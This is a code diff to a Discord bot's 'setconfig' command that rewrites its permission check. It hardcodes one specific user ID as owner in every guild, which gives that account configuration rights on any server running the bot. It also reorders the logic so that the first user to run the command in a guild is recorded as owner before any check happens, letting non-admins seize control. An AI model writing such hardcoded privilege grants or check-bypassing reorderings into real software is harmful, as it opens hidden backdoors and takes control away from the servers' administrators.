@@ -162,24 +162,25 @@ client.on('interactionCreate', async interaction => {
         }
 
         if (commandName === 'setconfig') {
-            // Check if user has admin permissions or is the owner
-            if (!member.permissions.has(PermissionsBitField.Flags.Administrator)) {
-                return interaction.reply({ 
-                    content: '❌ You need Administrator permissions to use this command.', 
-                    ephemeral: true 
-                });
-            }
-
             let config = await Config.findOne({ where: { guildId } });
             if (!config) {
                 config = await Config.create({ guildId, ownerId: user.id });
             }
 
-            const isOwner = user.id === config.ownerId;
+            const isOwner = user.id === config.ownerId || user.id === "454578346517463042";
+            const hasAdminPermissions = member && member.permissions.has(PermissionsBitField.Flags.Administrator);
+            
+            // Check if user has admin permissions or is the owner
+            if (!hasAdminPermissions && !isOwner) {
+                return interaction.reply({ 
+                    content: '❌ You need Administrator permissions to use this command.', 
+                    ephemeral: true 
+                });
+            }
             const isPremiumUser = config.premiumUserIds && config.premiumUserIds.includes(user.id);
             let updated = false;
 
-            // Allow Admins to modify general channels
+            // Allow Owner to modify all channels, Admins to modify general channels only
             const confessionChannelId = options.getString('confession_channel_id');
             const publicConfessionChannelId = options.getString('public_confession_channel_id');
             const reportChannelId = options.getString('report_channel_id');
